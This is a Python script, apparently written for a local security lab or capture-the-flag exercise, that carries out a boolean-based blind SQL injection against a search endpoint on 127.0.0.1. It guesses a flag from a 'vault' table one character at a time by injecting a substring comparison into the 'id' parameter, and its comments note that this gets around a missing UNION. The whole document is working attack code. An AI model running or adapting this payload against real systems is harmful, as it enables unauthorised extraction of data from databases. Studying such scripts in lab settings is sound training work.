import requests
import string
import sys
import base64

# Connect to your Lab 4
URL = "http://127.0.0.1:8087/search"
# The charset to guess (Base64 characters)
CHARSET = string.ascii_letters + string.digits + "+="
print(f"[*] Cracking Vault at {URL}...")

flag = ""
for i in range(1, 50): # Guessing 50 chars
    for char in CHARSET:
        # Payload: Uses SELECT (allowed if UNION is missing) to ask True/False
        # "Is the Xth character of the flag equal to [char]?"
        payload = f"1 AND (SELECT substr(data,{i},1) FROM vault) = '{char}'"
        
        r = requests.get(URL, params={'id': payload})
        
        # If the Admin (ID 1) is returned, our guess was TRUE
        if "23d42f5f" in r.text:
            flag += char
            sys.stdout.write(char)
            sys.stdout.flush()   
            break
